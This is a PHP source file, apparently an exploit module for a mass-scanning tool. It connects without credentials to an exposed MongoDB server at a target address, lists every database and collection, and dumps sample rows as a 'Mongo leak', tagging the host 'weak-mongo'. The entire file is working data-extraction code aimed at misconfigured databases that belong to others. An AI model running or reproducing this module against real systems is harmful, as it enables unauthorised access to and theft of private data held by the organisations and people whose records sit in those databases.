<?php
namespace Un1c0rn\Workers\Exploits;
use MongoClient;
class OpenMongo extends \Un1c0rn\BaseExploit implements \Un1c0rn\ExploitInterface {
	
	function getExploitData() {
		$m = new MongoClient('mongodb://'.$this->ip.':'.$this->port);
		$dbs = $m->listDBs();
		if(empty($dbs)) return false;
		$data = 'BEGIN Mongo leak :'.PHP_EOL;
		foreach($dbs['databases'] as $db) {
			$_db = $m->selectDB($db['name']);
			$data .= $db['name'].' DB selected'.PHP_EOL;
			foreach($_db->getCollectionNames() as $collectionName) {
				$data .= 'Found collection '.$collectionName.' dumping 3 rows :'.PHP_EOL;
				foreach($_db->$collectionName->find()->limit(3) as $row) {
					$data .= json_encode($row).PHP_EOL;
				}
				$data .= str_repeat('-',20).PHP_EOL;
			} 
		}
		$data .= 'END Mongo leak'.PHP_EOL;
		return $data;
	}
	function getAffectedPorts() {
		return array(27017,27018,27019);
	}
	function getTag() {
		return 'weak-mongo';
	}
}
